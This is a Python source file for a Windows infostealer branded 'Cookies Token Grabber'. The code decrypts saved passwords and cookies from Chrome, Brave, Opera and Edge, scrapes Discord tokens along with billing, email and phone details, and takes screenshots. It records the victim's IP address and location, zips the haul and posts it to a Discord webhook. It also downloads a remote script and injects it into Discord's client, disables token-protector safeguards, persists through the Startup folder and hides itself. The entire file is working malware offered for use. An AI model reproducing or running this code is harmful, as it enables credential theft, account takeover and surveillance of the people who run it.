import os
import json
import httpx
import ctypes
import shutil
import psutil
import asyncio
import sqlite3
import zipfile
import threading
import subprocess
import sys
import base64
import pyautogui
import win32crypt
import getpass
from sys import argv
from PIL import ImageGrab
from base64 import b64decode
from re import findall, match
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

error_message = "MESSAGE_HERE"

config = {

    'webhook': "WEBHOOK_HERE",

    'injection_url': "https://raw.githubusercontent.com/testy65421/site/main/shit.js",

    'kill_discord': KILL_DISCORD_STATUS,

    'startup': STARTUP_STATUS,

    'hide_self': HIDE_SELF_STATUS,

    'send_error_message': ERROR_MESSAGE_STATUS,
}


class functions(object):
    @staticmethod
    def getHeaders(token: str = None):
        headers = {
            "Content-Type": "application/json",
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    @staticmethod
    def get_master_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt_val(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    @staticmethod
    def config(e: str) -> str or bool:
        return config.get(e)


class Cookies_Token_Grabber(functions):
    def __init__(self):
        self.webhook = self.config('webhook')
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.temp = os.getenv("temp")
        self.startup = self.roaming + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
        self.dir = self.temp+"\\Cookies_Token_Grabber"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"

        try:
            os.mkdir(os.path.join(self.dir))
        except Exception:
            pass

        self.sep = os.sep
        self.tokens = []
        self.robloxcookies = []

    def try_extract(func):
        def wrapper(*args, **kwargs):
            try:
                func(*args, **kwargs)
            except Exception:
                pass
        return wrapper

    async def checkToken(self, tkn: str) -> str:
        try:
            r = httpx.get(
                url=self.baseurl,
                headers=self.getHeaders(tkn),
                timeout=5.0
            )
        except (httpx._exceptions.ConnectTimeout, httpx._exceptions.TimeoutException):
            pass
        if r.status_code == 200 and tkn not in self.tokens:
            self.tokens.append(tkn)

    async def init(self):
        await self.bypassBetterDiscord()
        await self.bypassTokenProtector()
        function_list = [self.screenshot, self.grabTokens
                         ] # self.grabRobloxCookie
        if self.config('hide_self'):
            function_list.append(self.hide)

        if self.config('kill_discord'):
            function_list.append(self.killDiscord)

        if self.config('startup'):
            function_list.append(self.startup)

        if os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Default') and os.path.exists(self.appdata+'\\Google\\Chrome\\User Data\\Local State'):
            function_list.append(self.grabPassword)
            function_list.append(self.grabCookies)

        self.grab_other_passwords()

        for func in function_list:
            process = threading.Thread(target=func, daemon=True)
            process.start()
        for t in threading.enumerate():
            try:
                t.join()
            except RuntimeError:
                continue
        self.neatifyTokens()
        await self.injector()
        self.finish()
        shutil.rmtree(self.dir)

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    def startup(self):
        try:
            shutil.copy2(argv[0], self.startup)
        except Exception:
            pass

    async def injector(self):
        for _dir in os.listdir(self.appdata):
            if 'discord' in _dir.lower():
                discord = self.appdata+self.sep+_dir
                disc_sep = discord+self.sep
                for __dir in os.listdir(os.path.abspath(discord)):
                    if match(r'app-(\d*\.\d*)*', __dir):
                        app = os.path.abspath(disc_sep+__dir)
                        inj_path = app+'\\modules\\discord_desktop_core-3\\discord_desktop_core\\'
                        if os.path.exists(inj_path):
                            if self.startup not in argv[0]:
                                try:
                                    os.makedirs(
                                        inj_path+'initiation', exist_ok=True)
                                except (FileExistsError, PermissionError):
                                    pass
                            f = httpx.get(self.config('injection_url')).text.replace(
                                "%WEBHOOK%", self.webhook)
                            with open(inj_path+'index.js', 'w', errors="ignore") as indexFile:
                                indexFile.write(f)
                            os.startfile(app + self.sep + _dir + '.exe')

    def killDiscord(self):
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in
                   ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def virtual_machine_check(self):
        sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=35, cols=170))

        FOUND = False
        detection = ""

        VmCehck1 = "vmsrvc.exe"
        VmCehck2 = "vmusrvc.exe"
        VmCehck3 = "vboxtray.exe"
        VmCehck4 = "vmtoolsd.exe"
        VmCehck5 = "df5serv.exe"
        VmCehck6 = "vboxservice.exe"
        for process in psutil.process_iter():
            try:
                if process.name().lower() == VmCehck1.lower():
                    FOUND = True
                else:
                    pass

                if process.name().lower() == VmCehck2.lower():
                    FOUND = True
                else:
                    pass

                if process.name().lower() == VmCehck3.lower():
                    FOUND = True
                else:
                    pass

                if process.name().lower() == VmCehck4.lower():
                    FOUND = True
                else:
                    pass

                if process.name().lower() == VmCehck5.lower():
                    FOUND = True
                else:
                    pass

                if process.name().lower() == VmCehck6.lower():
                    FOUND = True
                else:
                    pass
            except Exception as e:
                pass

        vmci = os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys")
        vmhgfs = os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys")
        vmmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys")
        vmsci = os.path.exists("C:\WINDOWS\system32\drivers\vmsci.sys")
        vmusbmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmusbmouse.sys")
        vmx_svga = os.path.exists("C:\WINDOWS\system32\drivers\vmx_svga.sys")
        VBoxMouse = os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys")


        if vmci == True:
            FOUND = True
        else:
            pass

        if vmhgfs == True:
            FOUND = True
        else:
            pass

        if vmmouse == True:
            FOUND = True
        else:
            pass

        if vmsci == True:
            FOUND = True
        else:
            pass

        if vmusbmouse == True:
            FOUND = True
        else:
            pass

        if vmx_svga == True:
            FOUND = True
        else:
            pass

        if VBoxMouse == True:
            FOUND = True
        else:
            pass

        # Finshed Checking for VM
        if FOUND == True:
            detection = "VM detected!"
        else:
            detection = "VM not detected"
        
        return detection


    def self_destruct_grabber(self):
        temp = (os.getenv("temp"))
        # cwd2 = sys.argv[0]
        # bat = """@echo off\n"""+ "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
        # temp6 = temp + r"\\kill.bat"
        # if os.path.isfile(temp6):
        #     os.remove(temp6)
        # f6 = open(temp + r"\\kill.bat", 'w')
        # f6.write(bat)
        # f6.close()
        # os.system(r"start /min %temp%\\kill.bat")


    async def bypassTokenProtector(self):
        tp = f"{self.roaming}\\DiscordTokenProtector\\"
        if not os.path.exists(tp):
            return
        config = tp+"config.json"

        for i in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(tp+i)
            except FileNotFoundError:
                pass
        if os.path.exists(config):
            with open(config, errors="ignore") as f:
                try:
                    item = json.load(f)
                except json.decoder.JSONDecodeError:
                    return
                item['Cookies_just_shit_on_this_token_protector'] = "http://cookiesservices.xyz"
                item['auto_start'] = False
                item['auto_start_discord'] = False
                item['integrity'] = False
                item['integrity_allowbetterdiscord'] = False
                item['integrity_checkexecutable'] = False
                item['integrity_checkhash'] = False
                item['integrity_checkmodule'] = False
                item['integrity_checkscripts'] = False
                item['integrity_checkresource'] = False
                item['integrity_redownloadhashes'] = False
                item['iterations_iv'] = 364
                item['iterations_key'] = 457
                item['version'] = 69420
            with open(config, 'w') as f:
                json.dump(item, f, indent=2, sort_keys=True)
            with open(config, 'a') as f:
                f.write(
                    "\n\n//Cookies just shit on this token protector | http://cookiesservices.xyz")

    async def bypassBetterDiscord(self):
        bd = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(bd):
            x = "api/webhooks"
            with open(bd, 'r', encoding="cp437", errors='ignore') as f:
                txt = f.read()
                content = txt.replace(x, 'CookiesTheGoat')
            with open(bd, 'w', newline='', encoding="cp437", errors='ignore') as f:
                f.write(content)

    def getProductValues(self):
        try:
            wkey = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", creationflags=0x08000000).decode().rstrip()
        except Exception:
            wkey = "N/A (Likely Pirated)"
        try:
            productName = subprocess.check_output(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName", creationflags=0x08000000).decode().rstrip()
        except Exception:
            productName = "N/A"
        return [productName, wkey]

    @try_extract
    def grabTokens(self):
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if "discord" not in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                asyncio.run(self.checkToken(token))
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = self.decrypt_val(b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                asyncio.run(self.checkToken(token))

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                asyncio.run(self.checkToken(token))

    @try_extract
    def grabPassword(self):
        master_key = self.get_master_key(
            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        login = self.temp+self.sep+"Loginvault1.db"

        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(
                    encrypted_password, master_key)
                if url != "":
                    f.write(
                        f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        cursor.close()
        conn.close()
        os.remove(login)

    @try_extract
    def grabCookies(self):
        master_key = self.get_master_key(
            self.appdata+'\\Google\\Chrome\\User Data\\Local State')
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Network\\cookies'
        login = self.temp+self.sep+"Loginvault2.db"
        shutil.copy2(login_db, login)
        conn = sqlite3.connect(login)
        cursor = conn.cursor()
        with open(self.dir+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            cursor.execute(
                "SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                decrypted_cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    f.write(
                        f"Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in decrypted_cookie:
                    self.robloxcookies.append(decrypted_cookie)
        cursor.close()
        conn.close()
        os.remove(login)

    def grab_other_passwords(self):
        def decrypt_payload(cipher, payload):
            return cipher.decrypt(payload)
        def generate_cipher(aes_key, iv):
            return AES.new(aes_key, AES.MODE_GCM, iv)
        def decrypt_password(buff, master_key):
            try:
                iv = buff[3:15]
                payload = buff[15:]
                cipher = generate_cipher(master_key, iv)
                decrypted_pass = decrypt_payload(cipher, payload)
                decrypted_pass = decrypted_pass[:-16].decode()
                return decrypted_pass
            except Exception as e:
                print(str(e))


        username = getpass.getuser()
        #######################################################################
        #######################################################################
        #######################################################################
        try:
            def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State', "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            if __name__ == '__main__':
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\default\\Login Data'
                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        with open(self.dir + "\\BravePasswords.txt","a") as f:
                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                            f.close()  
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass
        except FileNotFoundError:
            pass
        #######################################################################
        #######################################################################
        #######################################################################
        try:
            def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Local State', "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            if __name__ == '__main__':
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        with open(self.dir + "\\OperaPasswords.txt","a") as f:
                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                            f.close()
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass
        except FileNotFoundError:
            pass
        #######################################################################
        #######################################################################
        #######################################################################
        try:
            def get_master_key():
                with open(os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State', "r", encoding='utf-8') as f:
                    local_state = f.read()
                    local_state = json.loads(local_state)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                master_key = master_key[5:]  # removing DPAPI
                master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                return master_key
            if __name__ == '__main__':
                master_key = get_master_key()
                login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
                shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
                conn = sqlite3.connect("Loginvault.db")
                cursor = conn.cursor()
                try:
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = decrypt_password(encrypted_password, master_key)
                        with open(self.dir + "\\EdgePasswords.txt","a") as f:
                            f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                            f.close()             
                except Exception as e:
                    pass
                cursor.close()
                conn.close()
                try:
                    os.remove("Loginvault.db")
                except Exception as e:
                    pass
        except FileNotFoundError:
            pass


    def neatifyTokens(self):
        f = open(self.dir+"\\Discord Info.txt",
                 "w", encoding="cp437", errors='ignore')
        for token in self.tokens:
            j = httpx.get(
                self.baseurl, headers=self.getHeaders(token)).json()
            user = j.get('username') + '#' + str(j.get("discriminator"))

            badges = ""
            flags = j['flags']
            flags = j['flags']
            if (flags == 1):
                badges += "Staff, "
            if (flags == 2):
                badges += "Partner, "
            if (flags == 4):
                badges += "Hypesquad Event, "
            if (flags == 8):
                badges += "Green Bughunter, "
            if (flags == 64):
                badges += "Hypesquad Bravery, "
            if (flags == 128):
                badges += "HypeSquad Brillance, "
            if (flags == 256):
                badges += "HypeSquad Balance, "
            if (flags == 512):
                badges += "Early Supporter, "
            if (flags == 16384):
                badges += "Gold BugHunter, "
            if (flags == 131072):
                badges += "Verified Bot Developer, "
            if (badges == ""):
                badges = "None"
            email = j.get("email")
            phone = j.get("phone") if j.get(
                "phone") else "No Phone Number attached"
            nitro_data = httpx.get(
                self.baseurl+'/billing/subscriptions', headers=self.getHeaders(token)).json()
            has_nitro = False
            has_nitro = bool(len(nitro_data) > 0)
            billing = bool(len(json.loads(httpx.get(
                self.baseurl+"/billing/payment-sources", headers=self.getHeaders(token)).text)) > 0)
            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
        f.close()

    # def grabRobloxCookie(self):
    #     def subproc(path):
    #         try:
    #             return subprocess.check_output(
    #                 fr"powershell Get-ItemPropertyValue -Path {path}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",
    #                 creationflags=0x08000000).decode().rstrip()
    #         except Exception:
    #             return None
    #     reg_cookie = subproc(r'HKLM')
    #     if not reg_cookie:
    #         reg_cookie = subproc(r'HKCU')
    #     if reg_cookie:
    #         self.robloxcookies.append(reg_cookie)
    #     if self.robloxcookies:
    #         with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
    #             for i in self.robloxcookies:
    #                 f.write(i+'\n')

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def finish(self):
        for i in os.listdir(self.dir):
            if i.endswith('.txt'):
                path = self.dir+self.sep+i
                with open(path, "r", errors="ignore") as ff:
                    x = ff.read()
                    if not x:
                        try:
                            os.remove(path)
                        except PermissionError:
                            pass
                    else:
                        with open(path, "w", encoding="utf-8", errors="ignore") as f:
                            f.write(
                                "Cookies Token Grabber | cookiesservices.xyz\n\n")
                        with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                            fp.write(
                                x+"\n\nCookies Token Grabber | cookiesservices.xyz")
        w = self.getProductValues()
        detection = self.virtual_machine_check()
        data = httpx.get("https://ipinfo.io/json").json()
        ip = data.get('ip').replace(" ", "")
        city = data.get('city').replace(" ", "")
        country = data.get('country').replace(" ", "")
        region = data.get('region').replace(" ", "")
        googlemap = "https://www.google.com/maps/search/google+map++" + \
            data.get('loc')

        _zipfile = os.path.join(
            self.appdata, f'Cookies_Grabber-[{os.getlogin()}].zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.dir)
        for dirname, _, files in os.walk(self.dir):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()
        files_found = ''
        for f in os.listdir(self.dir):
            files_found += f"{f}\n"
        tokens = ''
        for tkn in self.tokens:
            tokens += f'{tkn}\n\n'
        fileCount = f"{len(files)} Files Found: "
        embed = {
        "username": "Grabber Logs",
            "avatar_url":"https://cdn.discordapp.com/attachments/753609345610154034/915996382517657660/ProfilePic.gif",
            "embeds": [
                {
                    "author": {
                        "name": "",
                        "url": "",
                        "icon_url": ""
                    },
                    "description": f"**{os.getlogin()}** Just ran Cookies Token Grabber\n\nVM Status: {detection}\n[Google Maps Location]({googlemap})\n\n```ComputerName: {os.getenv('COMPUTERNAME')}\n\nIP: {ip}\n\nCity: {city}\n\nRegion: {region}\n\nCountry: {country}```\n\n\n{fileCount}```{json.dumps(files, indent=4)}```\n", # To login with discord token goto [here]() copy the RAW code then goto [discord.com/login]() and open the Console (CTRL + SHIFT + I) delete everything and paste the code you copied then paste the discord token in the correct place and hit ENTER to login (Or a much easier way is to get my AccountNuker ;)
                    "color": 11600892,
                                                                                                                                        # Add local ip ^^
                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/947224575622676520/947640543171731466/egrthfgh.gif"
                    },       

                    "footer": {
                      "text": "CookiesKush420#4152 | cookiesservices.xyz"
                    }
                }
            ]
        }
        httpx.post(self.webhook, json=embed)
        with open(_zipfile, 'rb') as f:
            httpx.post(self.webhook, files={'upload_file': f})
        os.remove(_zipfile)

        if self.config('self_destruct'):
            self.self_destruct_grabber()

        brave = self.dir + "\\BravePasswords.txt"
        opera = self.dir + "\\OperaPasswords.txt"
        edge = self.dir + "\\EdgePasswords.txt"

        if os.path.exists(brave):
            os.remove(brave)
        
        if os.path.exists(opera):
            os.remove(opera)
        
        if os.path.exists(edge):
            os.remove(edge)

        if self.config('send_error_message'):
            print(pyautogui.alert(error_message))



if __name__ == "__main__" and os.name == "nt":
    asyncio.run(Cookies_Token_Grabber().init())
